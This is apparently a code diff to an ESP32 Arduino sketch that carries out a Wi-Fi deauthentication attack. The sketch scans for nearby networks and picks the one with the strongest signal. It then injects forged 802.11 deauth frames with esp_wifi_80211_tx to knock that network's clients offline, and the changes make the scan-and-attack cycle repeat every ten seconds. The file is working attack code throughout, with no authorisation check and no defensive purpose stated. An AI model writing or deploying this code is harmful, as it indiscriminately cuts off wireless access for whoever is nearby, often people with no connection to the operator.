@@ -5,6 +5,14 @@
 
 #define DEAUTH_REASON 7  // Reason for deauthentication, 7 is "class 3 frame" (disassociation)
 
+// Define how long the attack should run (in milliseconds)
+#define DEAUTH_DURATION 5000  // Attack duration: 5 seconds
+#define SCAN_INTERVAL 10000  // Interval before scanning again: 10 seconds
+
+unsigned long lastScanTime = 0;
+unsigned long lastDeauthTime = 0;
+bool isAttacking = false;
+
 void setup() {
   Serial.begin(115200);
   
@@ -12,7 +20,28 @@ void setup() {
   WiFi.mode(WIFI_STA);
   WiFi.disconnect();  // Disconnect any active connection
 
-  // Initialize Wi-Fi scanning
+  // Start initial scan
+  lastScanTime = millis();
+}
+
+void loop() {
+  unsigned long currentMillis = millis();
+
+  // If it's time to scan for new networks
+  if (currentMillis - lastScanTime >= SCAN_INTERVAL) {
+    Serial.println("Scanning for Wi-Fi networks...");
+    scan_wifi_networks();
+    lastScanTime = currentMillis;  // Reset scan timer
+  }
+
+  // If we're currently attacking a network, check if the attack duration has passed
+  if (isAttacking && currentMillis - lastDeauthTime >= DEAUTH_DURATION) {
+    Serial.println("Deauth attack finished, restarting scanning...");
+    isAttacking = false;  // Stop attacking after the duration
+  }
+}
+
+void scan_wifi_networks() {
   esp_wifi_scan_start(NULL, true);  // Start scanning for Wi-Fi networks
   
   // Wait for the scan to complete
@@ -25,39 +54,50 @@ void setup() {
   scan_results = (wifi_ap_record_t *)malloc(sizeof(wifi_ap_record_t) * network_count);
   esp_wifi_scan_get_ap_records(&network_count, scan_results);
 
-  // Find the strongest network (highest RSSI)
-  int strongest_network = -1;
-  int highest_rssi = -100;  // Arbitrarily low RSSI for comparison
+  // If no networks are found
+  if (network_count == 0) {
+    Serial.println("No Wi-Fi networks found.");
+    free(scan_results);
+    return;
+  }
 
+  Serial.println("Networks found:");
+  // Print SSID and RSSI of each network found
   for (int i = 0; i < network_count; i++) {
     Serial.print("SSID: ");
     Serial.print((char *)scan_results[i].ssid);
     Serial.print(" RSSI: ");
     Serial.println(scan_results[i].rssi);
+  }
 
+  // Find the strongest network (highest RSSI)
+  int strongest_network = -1;
+  int highest_rssi = -100;
+
+  for (int i = 0; i < network_count; i++) {
     if (scan_results[i].rssi > highest_rssi) {
       highest_rssi = scan_results[i].rssi;
       strongest_network = i;
     }
   }
 
+  // If a strongest network is found, send deauth frames
   if (strongest_network != -1) {
-    // Found the strongest network, now send deauth
-    Serial.println("Sending Deauth Packet to strongest network");
+    Serial.println();
+    Serial.println("Selecting the strongest network based on RSSI...");
+    Serial.print("The strongest network is: ");
+    Serial.print((char *)scan_results[strongest_network].ssid);
+    Serial.print(" with RSSI: ");
+    Serial.println(scan_results[strongest_network].rssi);
+    
+    // Start deauth attack and reset the timer
+    Serial.println("Sending Deauth Packet to the selected network...");
     send_deauth(scan_results[strongest_network].bssid);
+    lastDeauthTime = millis();  // Set the deauth timer
+    isAttacking = true;  // Indicate that we are attacking now
   }
 
-  // Clean up
-  free(scan_results);
-
-  // Wait and start scanning again
-  delay(5000);
-}
-
-void loop() {
-  // Re-scan networks after deauth
-  esp_wifi_scan_start(NULL, true);
-  delay(2000);  // Wait for the scan to complete
+  free(scan_results);  // Clean up
 }
 
 void send_deauth(uint8_t *bssid) {
@@ -73,7 +113,7 @@ void send_deauth(uint8_t *bssid) {
     deauth_frame[16 + i] = bssid[i];
   }
 
-  // Sending deauth frame
+  // Send deauth frame
   esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
-  Serial.println("Deauth packet sent");
+  Serial.println("Deauth packet sent.");
 }
